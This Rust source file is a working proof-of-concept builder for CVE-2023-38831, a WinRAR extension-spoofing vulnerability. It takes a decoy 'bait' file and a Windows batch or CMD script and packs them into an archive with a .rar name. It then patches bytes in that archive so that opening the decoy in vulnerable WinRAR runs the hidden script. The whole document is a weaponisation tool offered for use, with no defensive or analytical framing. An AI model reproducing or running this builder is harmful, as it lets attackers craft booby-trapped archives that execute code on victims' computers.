use std::fs;
use std::io;
use std::io::{BufReader, Read, Seek, Write};
use std::path;
use std::process::exit;
use std::str;

struct PartFile<'a> {
    role: &'a str,
    content: String,
}

fn main() {
    let mut bait = PartFile {
        role: "bait",
        content: String::new(),
    };
    let mut script = PartFile {
        role: "script",
        content: String::new(),
    };
    let mut out = String::new();

    println!("CVE-2023-38831 POC\n--------------------------------------------");
    println!("Please input your \"bait\" file name: ");
    io::stdin()
        .read_line(&mut bait.content)
        .expect("Error: couldn't read line");
    bait.content = bait.content.trim().to_string();
    check_path(&bait);

    println!("Please input your \"script\" file name: ");
    io::stdin()
        .read_line(&mut script.content)
        .expect("Error: couldn't read line");
    script.content = script.content.trim().to_string();
    check_path(&script);

    println!("Please input your \"output\" RAR file name: ");
    io::stdin()
        .read_line(&mut out)
        .expect("Error: couldn't read line");
    out = out.trim().to_string();

    // Move to new tmp folder
    let tmpfiles = copy_to_tmp((&bait, &script));

    // zip em up!
    match create_zip(
        out.as_str(),
        bait.content.as_str(),
        (
            tmpfiles.1.as_path().display().to_string().as_str(),
            tmpfiles.2.as_path().display().to_string().as_str(),
        ),
    ) {
        Ok(_) => {}
        Err(e) => {
            println!("Error: {e}");
            exit(1);
        }
    };

    //exploit em
    match exploit(out.as_str(), bait.content.as_str()) {
        Ok(_) => {}
        Err(e) => {
            println!("Error: {e}");
            exit(1);
        }
    }
}

fn check_path(filepath: &PartFile) {
    if path::Path::new(filepath.content.as_str()).exists() != true {
        println!(
            "Error: \"{}\" path \"{}\" doesn't exist!",
            filepath.role, filepath.content
        );
        exit(1);
    };
    if filepath.role == "script" {
        if filepath.content.ends_with(".bat") != true && filepath.content.ends_with(".cmd") != true
        {
            println!("Error: Script must be a Windows Batch or CMD file!");
            exit(1);
        };
    };
}

fn copy_to_tmp(files: (&PartFile, &PartFile)) -> (String, path::PathBuf, path::PathBuf) {
    let tmp = path::Path::new("tmp");
    if tmp.exists() {
        let _ = fs::remove_dir_all("tmp");
    }
    let script = path::Path::new(files.1.content.as_str());
    let baitextension = if files.0.content.contains(".") {
        &files.0.content[files.0.content.find(".").unwrap()..]
    } else {
        ""
    };

    let baitname = if files.0.content.contains(".") {
        &files.0.content[..files.0.content.find(".").unwrap()]
    } else {
        &files.0.content
    };

    let tmpscriptpath = tmp.join("tmp1").join("tmp.cmd");
    let tmpfilepath = tmp.join("tmp1").join(String::from("tmp.") + baitextension);
    match fs::create_dir_all(tmp.join("tmp1")) {
        Ok(_) => {}
        Err(result) => {
            println!("{result}");
            exit(1);
        }
    };
    match fs::create_dir_all(tmp.join("tmp2")) {
        Ok(_) => {}
        Err(result) => {
            println!("{result}");
            exit(1);
        }
    };
    match fs::copy(script, &tmpscriptpath) {
        Ok(_) => {}
        Err(result) => {
            println!("Error: {result}");
            exit(1);
        }
    };
    match fs::copy(files.0.content.as_str(), &tmpfilepath) {
        Ok(_) => {}
        Err(result) => {
            println!("Error: {result}");
            exit(1);
        }
    };
    (String::from(baitname), tmpscriptpath, tmpfilepath)
}

fn create_zip(out_name: &str, baitname: &str, files: (&str, &str)) -> zip::result::ZipResult<()> {
    let tmpscriptpath = files.0;
    let tmpfilepath = files.1;
    let zipname = if out_name.contains('.') {
        &out_name[..out_name.find('.').unwrap()]
    } else {
        out_name
    };

    let realbaitname = if baitname.contains('/') {
        &baitname[baitname.find("/").unwrap() + 1..]
    } else if baitname.contains('\\') {
        &baitname[baitname.find("\\").unwrap() + 1..]
    } else {
        baitname
    };
    let filepath = realbaitname.to_string().to_owned() + "A";
    let scriptpath = path::Path::new((realbaitname.to_string().to_owned() + "B").as_str())
        .join(realbaitname.to_string().to_owned() + "B" + ".cmd");

    //making zipfile ready
    let zip_path = path::Path::new("tmp")
        .join("tmp2")
        .join(String::from(zipname) + ".rar");
    let zip_file = fs::File::create(&zip_path).unwrap();
    let mut zipfile = zip::ZipWriter::new(zip_file);

    // creating zip
    zipfile.start_file(filepath.as_str(), Default::default())?;
    zipfile.write_all(
        fs::read_to_string(tmpfilepath)
            .expect("Should have been able to read")
            .as_bytes(),
    )?;

    zipfile.add_directory(
        realbaitname.to_string().to_owned() + "B",
        Default::default(),
    )?;
    zipfile.start_file(
        scriptpath.as_path().display().to_string(),
        Default::default(),
    )?;
    zipfile.write_all(
        fs::read_to_string(tmpscriptpath)
            .expect("Should have been able to read")
            .as_bytes(),
    )?;
    zipfile.finish()?;
    Ok(())
}

fn exploit(outname: &str, baitname: &str) -> io::Result<()> {
    let baitextension = if baitname.contains(".") {
        &baitname[baitname.find(".").unwrap() + 2..]
    } else {
        &baitname[baitname.len() - 2..]
    };
    let realoutname = String::from(if outname.contains('.') {
        &outname[..outname.find('.').unwrap()]
    } else {
        outname
    }) + ".rar";
    let rarpath = path::Path::new("tmp").join("tmp2").join(&realoutname);
    let newrarpath = path::Path::new(&std::env::current_dir().unwrap())
        .join("output")
        .join(&realoutname);
    // check if output path exists
    if path::Path::new("output").exists() != true {
        fs::create_dir("output")?;
    };
    // copy file
    match fs::copy(rarpath, &newrarpath) {
        Ok(_) => {}
        Err(e) => {
            println!("Error: {e}");
            exit(1);
        }
    };

    // open file for reading and writing

    let mut rarfile = fs::OpenOptions::new()
        .read(true)
        .write(true)
        .create(true)
        .open(&newrarpath)
        .unwrap();
    let mut reader = BufReader::new(&rarfile);
    let mut buffer = Vec::new();

    reader.read_to_end(&mut buffer)?;
    for (i, value) in buffer.iter().enumerate() {
        if value.is_ascii_uppercase()
            && value == &65
            && buffer[i - 2] == baitextension.chars().nth(0).unwrap() as u8
            && buffer[i - 1] == baitextension.chars().nth(1).unwrap() as u8
        {
            rarfile
                .seek(io::SeekFrom::Start(i.try_into().unwrap()))
                .unwrap();
            rarfile.write_all(&b' '.to_le_bytes()).unwrap();
        } else if value.is_ascii_uppercase()
            && value == &66
            && buffer[i - 2] == baitextension.chars().nth(0).unwrap() as u8
            && buffer[i - 1] == baitextension.chars().nth(1).unwrap() as u8
        {
            rarfile
                .seek(io::SeekFrom::Start(i.try_into().unwrap()))
                .unwrap();
            rarfile.write_all(&b' '.to_le_bytes()).unwrap();
        };
    }

    fs::remove_dir_all("tmp")?;
    println!(
        "Done! Your file is now in {}",
        path::Path::new(&std::env::current_dir().unwrap())
            .join("output")
            .join(&realoutname)
            .as_path()
            .display()
            .to_string()
    );
    Ok(())
}
